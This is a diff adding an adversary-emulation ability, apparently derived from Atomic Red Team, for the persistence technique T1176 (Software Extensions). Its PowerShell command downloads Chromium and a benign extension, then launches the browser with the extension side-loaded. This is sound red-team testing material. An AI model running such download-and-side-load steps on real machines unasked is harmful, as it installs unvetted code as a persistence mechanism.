@@ -1,0 +1,19 @@
+- id: ecf3d0d3-e928-4d10-8fa3-e35d3f26aae3
+  name: Software Extensions
+  description: Ability for Software Extensions (ATT&CK T1176). Generated from Atomic
+    Red Team procedures; review and test safely before use.
+  tactic: persistence
+  technique:
+    attack_id: T1176
+    name: Software Extensions
+  platforms:
+    windows:
+      psh:
+        command: '# Chromium $chromium = "https://commondatastorage.googleapis.com/chromium-browser-snapshots/Win_x64/1153778/chrome-win.zip"
+          # uBlock Origin Lite to test side-loading $extension = "https://github.com/uBlockOrigin/uBOL-home/releases/download/uBOLite_2024.11.25.1376/uBOLite_2024.11.25.1376.chromium.mv3.zip"
+          Set-Location "#{working_dir}" Set-Variable ProgressPreference SilentlyContinue
+          Invoke-WebRequest -URI $chromium -OutFile "#{working_dir}\chrome.zip" Invoke-WebRequest
+          -URI $extension -OutFile "#{working_dir}\extension.zip" Expand-Archive chrome.zip
+          -DestinationPath "#{working_dir}" -Force Expand-Archive extension.zip -Force
+          Start-Process .\chrome-win\chrome.exe --load-extension="#{working_dir}\extension\"
+          -PassThru'
